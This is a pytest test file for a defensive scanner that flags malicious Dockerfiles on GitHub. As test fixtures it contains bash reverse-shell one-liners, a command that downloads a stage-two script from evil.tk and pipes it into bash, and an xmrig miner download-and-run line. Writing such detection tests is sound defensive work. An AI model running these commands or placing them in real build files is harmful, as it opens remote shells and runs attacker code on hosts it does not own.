"""Tests for the Dockerfile-in-git scanner (scanning/dockerfile.py)."""

from __future__ import annotations

from unittest.mock import MagicMock

import pytest

from knorr.models import DetectionMethod, FindingStatus
from knorr.scanning.dockerfile import (
    _BENCHMARK_CONTENT,
    DockerfileHit,
    finding_from_hit,
    is_defensive,
    is_dockerfile,
    scan_dockerfiles,
)

# ---------------------------------------------------------------------------
# is_defensive
# ---------------------------------------------------------------------------

@pytest.mark.parametrize("repo", [
    "user/pentest-tools",
    "evil/ctf-challenge",
    "sec/red-team-scripts",
    "user/revshell-collection",
    "foo/exploit-db",
    "user/payloads-repo",
    "corp/security-training",
    "htb/machines",
    "oscp/notes",
    "user/awesome-hacking",
    "user/writeup-htb",
    "user/lab-exercises",
])
def test_is_defensive_security_repos(repo):
    assert is_defensive(repo) is True


@pytest.mark.parametrize("repo", [
    "teamtnt/xmrig-image",
    "user/myapp",
    "corp/webserver",
    "dev/backend-service",
])
def test_is_defensive_normal_repos(repo):
    assert is_defensive(repo) is False


def test_is_defensive_path_match():
    assert is_defensive("user/myapp", path="docs/revshell-examples.txt") is True


def test_is_defensive_path_safe():
    # 'Dockerfile' no longer triggers the fixed \bdocs?\b pattern (Doc != docs?)
    assert is_defensive("user/myapp", path="Dockerfile") is False
    assert is_defensive("user/myapp", path="Containerfile") is False


# ---------------------------------------------------------------------------
# is_dockerfile
# ---------------------------------------------------------------------------

@pytest.mark.parametrize("path", [
    "Dockerfile",
    "docker/Dockerfile",
    "services/web/Dockerfile",
    "Dockerfile.prod",
    "Containerfile",
    "app.dockerfile",
    "Dockerfile-dev",
])
def test_is_dockerfile_valid(path):
    assert is_dockerfile(path) is True


@pytest.mark.parametrize("path", [
    "README.md",
    "docs/Dockerfile-explanation.md",
    "Dockerfile.txt",
    "notes.rst",
    "config.yaml",
    "manifest.json",
    "build.html",
])
def test_is_dockerfile_invalid(path):
    assert is_dockerfile(path) is False


# ---------------------------------------------------------------------------
# _BENCHMARK_CONTENT
# ---------------------------------------------------------------------------

def test_benchmark_content_matches_canary():
    text = "# terminal-bench-canary: ignore this file"
    assert _BENCHMARK_CONTENT.search(text) is not None


def test_benchmark_content_clean():
    text = "FROM alpine\nRUN apk add curl"
    assert _BENCHMARK_CONTENT.search(text) is None


# ---------------------------------------------------------------------------
# scan_dockerfiles (mocked GitHub client)
# ---------------------------------------------------------------------------

def _make_client(items=None, content=""):
    """Build a minimal fake GitHubClient."""
    client = MagicMock()
    client.search_code.return_value = items or []
    client.get_content.return_value = content
    return client


def test_scan_dockerfiles_empty_results():
    client = _make_client(items=[])
    hits = scan_dockerfiles(client, queries=("q1",), per_query=5, pace=0)
    assert hits == []


def test_scan_dockerfiles_skips_defensive_repo():
    items = [{"repository": {"full_name": "user/pentest-tools"}, "path": "Containerfile",
              "html_url": "https://github.com/user/pentest-tools/blob/main/Containerfile"}]
    client = _make_client(items=items, content="bash -i >& /dev/tcp/1.2.3.4/4444 0>&1")
    hits = scan_dockerfiles(client, queries=("test",), per_query=5, pace=0)
    assert hits == []


def test_scan_dockerfiles_skips_non_dockerfile():
    items = [{"repository": {"full_name": "user/myapp"}, "path": "build/notes.md",
              "html_url": "https://github.com/user/myapp/blob/main/build/notes.md"}]
    client = _make_client(items=items, content="bash -i >& /dev/tcp/1.2.3.4/4444 0>&1")
    hits = scan_dockerfiles(client, queries=("test",), per_query=5, pace=0)
    assert hits == []


def test_scan_dockerfiles_skips_benchmark_content():
    items = [{"repository": {"full_name": "user/myapp"}, "path": "Containerfile",
              "html_url": "https://github.com/user/myapp/blob/main/Containerfile"}]
    content = "# terminal-bench-canary: canary GUID test\nbash -i >&/dev/tcp/1.2.3.4/4444"
    client = _make_client(items=items, content=content)
    hits = scan_dockerfiles(client, queries=("test",), per_query=5, pace=0)
    assert hits == []


def test_scan_dockerfiles_skips_unreadable():
    items = [{"repository": {"full_name": "user/myapp"}, "path": "Containerfile",
              "html_url": "https://github.com/user/myapp/blob/main/Containerfile"}]
    client = _make_client(items=items, content=None)
    hits = scan_dockerfiles(client, queries=("test",), per_query=5, pace=0)
    assert hits == []


def test_scan_dockerfiles_clean_dockerfile():
    items = [{"repository": {"full_name": "user/myapp"}, "path": "Dockerfile",
              "html_url": "https://github.com/user/myapp/blob/main/Dockerfile"}]
    client = _make_client(items=items, content="FROM alpine\nRUN apk add curl nginx")
    hits = scan_dockerfiles(client, queries=("test",), per_query=5, pace=0)
    assert hits == []  # clean content => no signals


def test_scan_dockerfiles_confirmed_revshell():
    items = [{"repository": {"full_name": "evil/backdoor"}, "path": "Dockerfile",
              "html_url": "https://github.com/evil/backdoor/blob/main/Dockerfile"}]
    content = "FROM alpine\nRUN bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n"
    client = _make_client(items=items, content=content)
    hits = scan_dockerfiles(client, queries=("test",), per_query=5, pace=0)
    assert len(hits) == 1
    assert hits[0].confirmed is True
    assert hits[0].repo == "evil/backdoor"
    assert hits[0].tier is not None


def test_scan_dockerfiles_candidate_scored_but_not_confirmed():
    """A miner binary alone is scored but must NOT confirm."""
    items = [{"repository": {"full_name": "user/mining"}, "path": "Dockerfile",
              "html_url": "https://github.com/user/mining/blob/main/Dockerfile"}]
    content = "FROM alpine\nRUN wget http://dl.xmrig.com/xmrig-bin && ./xmrig-bin\n"
    client = _make_client(items=items, content=content)
    hits = scan_dockerfiles(client, queries=("test",), per_query=5, pace=0)
    # Scored (miner binary signal) but confirmed status depends on gate
    assert len(hits) >= 1
    assert hits[0].score > 0


def test_scan_dockerfiles_deduplicates_repo_path():
    """Same repo:path from two queries appears only once."""
    item = {"repository": {"full_name": "evil/backdoor"}, "path": "Dockerfile",
            "html_url": "https://github.com/evil/backdoor/blob/main/Dockerfile"}
    client = _make_client(items=[item],  # search_code returns same item for each query
                          content="FROM alpine\nRUN bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n")
    # Two queries both returning the same item -> deduplicated to one hit
    hits = scan_dockerfiles(client, queries=("q1", "q2"), per_query=5, pace=0)
    assert len(hits) == 1


def test_scan_dockerfiles_skips_missing_repo():
    items = [{"repository": {}, "path": "Dockerfile", "html_url": "https://x"}]
    client = _make_client(items=items, content="RUN bash -i >& /dev/tcp/1.2.3.4/4444 0>&1")
    hits = scan_dockerfiles(client, queries=("test",), per_query=5, pace=0)
    assert hits == []


def test_scan_dockerfiles_confirms_c2():
    items = [{"repository": {"full_name": "evil/c2image"}, "path": "Dockerfile",
              "html_url": "https://github.com/evil/c2image/blob/main/Dockerfile"}]
    content = "FROM ubuntu\nRUN curl http://evil.tk/stage2.sh | base64 -d | bash\n"
    client = _make_client(items=items, content=content)
    hits = scan_dockerfiles(client, queries=("test",), per_query=5, pace=0)
    assert any(h.confirmed for h in hits)


def test_scan_dockerfiles_uses_known_set():
    """A repo:path already in the ``known`` set is skipped."""
    item = {"repository": {"full_name": "evil/backdoor"}, "path": "Dockerfile",
            "html_url": "https://github.com/evil/backdoor/blob/main/Dockerfile"}
    client = _make_client(items=[item],
                          content="FROM alpine\nRUN bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n")
    # key = "evil/backdoor:dockerfile" (casefold of repo:path)
    hits = scan_dockerfiles(client, queries=("test",), per_query=5, pace=0,
                            known={"evil/backdoor:dockerfile"})
    assert hits == []


def test_dockerfile_hit_fields():
    h = DockerfileHit(
        repo="evil/backdoor",
        path="Dockerfile",
        url="https://github.com/evil/backdoor/blob/main/Dockerfile",
        score=10,
        tier="A:reverse_shell",
        confirmed=True,
        signals=["reverse_shell/bash-tcp"],
        confirming=[{"category": "reverse_shell", "rule": "bash-tcp", "evidence": "..."}],
    )
    assert h.repo == "evil/backdoor"
    assert h.confirmed is True
    assert "reverse_shell/bash-tcp" in h.signals


# ---------------------------------------------------------------------------
# finding_from_hit: maps a DockerfileHit onto the shared ImageFinding record,
# so a hit shows up in the same registry (dashboard, `knorr watch` alerts) as
# a malicious image. Shared by cli.py's `knorr dockerfiles` and watch.py's
# periodic dockerfile round.
# ---------------------------------------------------------------------------

def test_confirmed_hit_maps_to_confirmed_status():
    hit = DockerfileHit(
        repo="DVKunion/test_ci", path="Dockerfile",
        url="https://github.com/DVKunion/test_ci/blob/abc/Dockerfile",
        score=5, tier="A:reverse_shell", confirmed=True,
        signals=["reverse_shell/bash-tcp"],
        confirming=[{"category": "reverse_shell", "rule": "bash-tcp",
                     "evidence": "bash -i >&/dev/tcp/1.2.3.4/80 0>&1"}])
    f = finding_from_hit(hit)
    assert f.status == FindingStatus.CONFIRMED
    assert f.detection_method == DetectionMethod.DOCKERFILE_SCAN
    assert f.image == "github.com/dvkunion/test_ci:dockerfile"
    assert f.tier == "A:reverse_shell"
    assert f.score == 5
    assert f.confirming == hit.confirming
    assert f.evidence["dockerfile_url"] == hit.url
    assert f.publisher == "dvkunion"


def test_unconfirmed_high_score_maps_to_screened():
    hit = DockerfileHit(repo="org/repo", path="Dockerfile", url="https://x", score=6)
    f = finding_from_hit(hit)
    assert f.status == FindingStatus.SCREENED


def test_unconfirmed_low_score_maps_to_candidate():
    hit = DockerfileHit(repo="org/repo", path="Dockerfile", url="https://x", score=1)
    f = finding_from_hit(hit)
    assert f.status == FindingStatus.CANDIDATE


def test_finding_image_key_is_reversible_to_repo_and_path():
    """cli.py derives `known` for scan_dockerfiles by stripping the
    "github.com/" prefix back to a "repo:path" key; the format must round-trip."""
    hit = DockerfileHit(repo="Owner/Repo", path="docker/Dockerfile.prod", url="https://x")
    f = finding_from_hit(hit)
    assert f.image.startswith("github.com/")
    stripped = f.image[len("github.com/"):]
    assert stripped == "owner/repo:docker/dockerfile.prod"


def test_finding_reasoning_includes_facets():
    hit = DockerfileHit(repo="org/repo", path="Dockerfile", url="https://x",
                        signals=["reverse_shell/bash-tcp", "obfuscation/eval-atob"])
    f = finding_from_hit(hit)
    assert "reverse_shell" in f.reasoning
    assert "obfuscation" in f.reasoning
